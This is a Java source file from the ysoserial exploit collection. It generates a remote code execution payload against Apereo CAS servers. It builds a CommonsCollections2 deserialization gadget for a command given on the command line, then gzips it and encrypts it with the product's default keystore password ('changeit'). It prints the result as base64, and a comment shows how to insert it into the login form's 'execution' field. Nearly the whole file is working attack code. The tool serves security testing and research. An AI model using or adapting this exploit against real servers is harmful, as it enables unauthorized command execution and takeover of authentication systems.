package ysoserial.exploit;

import org.apache.commons.codec.binary.Base64;
import org.cryptacular.bean.BufferedBlockCipherBean;
import org.cryptacular.bean.CipherBean;
import org.cryptacular.bean.KeyStoreFactoryBean;
import org.cryptacular.generator.sp80038a.RBGNonce;
import org.cryptacular.io.URLResource;
import org.cryptacular.spec.BufferedBlockCipherSpec;
import ysoserial.payloads.CommonsCollections2;

import java.io.*;
import java.net.URL;
import java.security.KeyStore;
import java.util.zip.GZIPOutputStream;


public class ApereoCAS {
    private CipherBean cipherBean;
    private boolean compression = true;

    public ApereoCAS() throws IOException {
        BufferedBlockCipherBean bufferedBlockCipherBean = new BufferedBlockCipherBean();
        bufferedBlockCipherBean.setBlockCipherSpec(new BufferedBlockCipherSpec("AES", "CBC", "PKCS7"));
        bufferedBlockCipherBean.setKeyStore(this.createAndPrepareKeyStore());
        bufferedBlockCipherBean.setKeyAlias("aes128");
        bufferedBlockCipherBean.setKeyPassword("changeit");
        bufferedBlockCipherBean.setNonce(new RBGNonce());
        this.setCipherBean(bufferedBlockCipherBean);
    }

    protected void setCipherBean(CipherBean cipherBean) {
        this.cipherBean = cipherBean;
    }

    public byte[] encode(Object o) throws IOException {
        if (o == null) {
            return new byte[0];
        } else {
            ByteArrayOutputStream outBuffer = new ByteArrayOutputStream();
            ObjectOutputStream out = null;

            try {
                if (this.compression) {
                    out = new ObjectOutputStream(new GZIPOutputStream(outBuffer));
                } else {
                    out = new ObjectOutputStream(outBuffer);
                }

                out.writeObject(o);
            } finally {
                if (out != null) {
                    out.close();
                }

            }

            try {
                return this.cipherBean.encrypt(outBuffer.toByteArray());
            } catch (Exception var7) {
                throw new IOException("Encryption error", var7);
            }
        }
    }

    protected KeyStore createAndPrepareKeyStore() {
        KeyStoreFactoryBean ksFactory = new KeyStoreFactoryBean();
        URL u = this.getClass().getResource("/etc/keystore.jceks");
        ksFactory.setResource(new URLResource(u));
        ksFactory.setType("JCEKS");
        ksFactory.setPassword("changeit");
        return ksFactory.newInstance();
    }

    public static void main(String[] args) {
        /**
         * username=aa&password=aa&lt=&execution=0-0-0-0-0_[base64]&_eventId=submit&submit=LOGIN
         */
        try{
            if (args.length == 1) {
                Object o = new CommonsCollections2().getObject(args[0]);
                ApereoCAS et = new ApereoCAS();
                String payload = Base64.encodeBase64String(et.encode(o));
                System.out.println(payload);
            } else {
                System.out.println("Usage " + ApereoCAS.class.getName() + " <command>");
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
